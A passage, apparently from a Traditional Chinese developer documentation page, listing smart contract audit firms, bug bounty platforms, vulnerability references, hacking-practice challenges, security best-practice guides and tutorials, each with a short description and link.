- **[Hacken](https://hacken.io)** - _為區塊鏈安全採用 360 度全方位方法的 Web3 網路安全審核者。_

- **[Nethermind](https://nethermind.io/smart-contracts-audits)** - _Solidity 和 Cairo 稽核服務，確保智慧型合約完整性、以及以太坊及 Starknet 使用者的安全。_

- **[HashEx](https://hashex.org/)** - _HashEx 專注於區塊鏈和智慧型合約審核，以確保加密貨幣的安全性，提供智慧型合約開發、滲透測試、區塊鏈諮詢等服務。_

- **[Code4rena](https://code4rena.com/)** - _鼓勵智慧型合約安全性專家找出漏洞，並協助提升 Web3 安全性，富競爭力的審核平台。_

- **[CodeHawks](https://codehawks.com/)** - _舉辦面向安全研究人員的智慧型合約審核比賽的競爭性審核平台。_

- **[Cyfrin](https://cyfrin.io)** - _Web3 安全巨頭，透過產品和智慧型合約審核服務來發展加密安全。_

- **[ImmuneBytes](https://www.immunebytes.com//smart-contract-audit/)** - _Web3 安全公司，透過經驗豐富的審核者團隊和一流工具，為區塊鏈系統提供安全審核。_

- **[Oxorio](https://oxor.io/)** - _智慧型合約審核和區塊鏈安全服務，在以太坊虛擬機、Solidity、零知識、加密公司和去中心化金融專案的跨鏈技術方面擁有深厚的專業知識。_

- **[Inference](https://inference.ag/)** - _安全審核公司，專注基於以太坊虛擬機區塊鏈的智慧型合約審核。 透過專家審核者的幫助，他們能發現潛在問題並提出可行的解決方案，以便在部署前解決這些問題。_

### 漏洞懸賞平台 {#bug-bounty-platforms}

- **[Immunefi](https://immunefi.com/)** - _這是智慧型合約和去中心化金融專案漏洞懸賞平台。安全研究員在此審核程式碼、找出漏洞、獲得報酬、使加密貨幣更安全。_

- **[HackerOne](https://www.hackerone.com/)** - _連結商業和滲透測試者及安全研究者的漏洞協調和漏洞懸賞平台。_

- **[HackenProof](https://hackenproof.com/)** - _專業的加密貨幣專案（去中心化金融、智慧型合約、錢包、中心化交易所等）漏洞懸賞平台。安全專業人士在此提供分類服務，而研究者可以在提出重要、經過驗證的錯誤報告時獲得報酬。_

-  **[Sherlock](https://www.sherlock.xyz/)** - _Web3 中的智慧型合約安全承銷商，透過智慧型合約管理對審核者的支出，以確保相關漏洞得到公平償付。_

-  **[CodeHawks](https://www.codehawks.com/)** - _競爭性漏洞懸賞平台，審核者可以在其中參與安全競賽和挑戰，以及自己的私人審核（即將推出）。_

### 已知的智慧型合約漏洞和弱點出版品 {#common-smart-contract-vulnerabilities-and-exploits}

- **[ConsenSys：已知的智慧型合約攻擊](https://consensys.github.io/smart-contract-best-practices/attacks/)** - _以適合初學者的方式解說最重大的合約漏洞，大部分案例會附上範例程式碼。_

- **[SWC Registry](https://swcregistry.io/)** - _適用於以太坊智慧型合約的通用弱點列表 (CWE) 精選清單。_

- **[Rekt](https://rekt.news/)** - _知名加密貨幣駭客和侵入事件的定期更新的出版品，並附上詳細的事後剖析報告。_

### 學習智慧型合約安全性的挑戰 {#challenges-for-learning-smart-contract-security}

- **[優質的 BlockSec CTF](https://github.com/blockthreat/blocksec-ctfs)** - _區塊鏈安全性的實戰演習、挑戰、和[奪旗](https://www.webopedia.com/definitions/ctf-event/amp/)競賽和解決方案評論精選清單。_

- **[脆弱不堪的去中心化金融](https://www.damnvulnerabledefi.xyz/)** - _學習去中心化金融智慧型合約攻撃性安全防衛的實戰演習，以及培養找出錯誤和審核安全性的技能。_

- **[Ethernaut](https://ethernaut.openzeppelin.com/)** - _以 Web3/Solidity 為中心的實戰演習，每一個等級都是一個必須被「駭客破解」的智慧型合約。_

- **[HackenProof x HackTheBox](https://app.hackthebox.com/tracks/HackenProof-Track)** - _智慧型合約駭客挑戰，以奇幻冒險為背景。 成功完成挑戰還可以入圍非公開的漏洞懸賞計劃。_

### 保護智慧型合約的最佳案例 {#smart-contract-security-best-practices}

- **[ConsesSys：以太坊智慧型合約安全性最佳案例](https://consensys.github.io/smart-contract-best-practices/)** - _保護以太坊智慧型合約安全性之準則的完整清單。_

- **[Nascent：簡單的安全性工具組](https://github.com/nascentxyz/simple-security-toolkit)** - _安全導向的實用智慧型合約開發指南與檢核清單。_

- **[Solidity 模式](https://fravoll.github.io/solidity-patterns/)** - _關於智慧型合約程式語言 Solidity 的安全性模型和最佳案例的實用彙總。_

- **[Solidity 文件：安全性考量](https://docs.soliditylang.org/en/v0.8.16/security-considerations.html)** - _使用 Solidity 編寫安全智慧型合約的指南。_

- **[智慧型合約安全性驗證標準](https://github.com/securing/SCSVS)** - _適用於開發者、架構師、安全性審查者和廠商的標準化智慧型合約安全性 14 點檢查清單。_

- **[學習智慧型合約安全與審核](https://updraft.cyfrin.io/courses/security)** - _出色的智慧型合約安全與審核課程，為希望提升安全最佳做法並成為安全研究人員的智慧型合約開發人員而設。_

### 關於智慧型合約安全性的使用教學 {#tutorials-on-smart-contract-security}

- [如何編寫安全的智慧型合約](/developers/tutorials/secure-development-workflow/)

- [如何使用 Slither 來搜尋智慧型合約漏洞](/developers/tutorials/how-to-use-slither-to-find-smart-contract-bugs/)

- [如何使用 Manticore 搜索智慧型合約bug.](/developers/tutorials/how-to-use-manticore-to-find-smart-contract-bugs/)

- [智慧型合約安全指南](/developers/tutorials/smart-contract-security-guidelines/)

- [如何安全整合包含任意代幣的代幣合約](/developers/tutorials/token-integration-checklist/)

- [Cyfrin Updraft - 智慧型合約安全與審核完整課程](https://updraft.cyfrin.io/courses/security)
